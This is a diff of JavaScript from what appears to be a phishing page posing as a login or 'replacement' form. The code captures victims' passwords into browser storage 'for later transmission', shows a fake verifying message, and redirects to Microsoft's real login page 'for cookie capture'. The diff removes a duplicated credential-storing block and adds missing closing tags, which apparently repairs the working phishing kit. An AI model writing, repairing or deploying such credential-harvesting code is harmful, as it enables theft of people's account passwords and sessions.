@@ -203,17 +203,6 @@
         } catch (e) {
           console.warn('Failed to store credentials:', e);
         }
-            password: password,
-            detail: detail,
-            captureTime: new Date().toISOString(),
-            source: 'replacement-form'
-          };
-          localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-          sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-          console.log('Credentials stored for later transmission');
-        } catch (e) {
-          console.warn('Failed to store credentials:', e);
-        }
 
         // Show verifying state
         $('#submit-btn').html('Verifying...');
@@ -223,3 +212,9 @@
           // Always redirect to Microsoft login for cookie capture
           window.location.replace("https://login.microsoftonline.com");
         }, 1500);
+      });
+
+    });
+  </script>
+</body>
+</html>
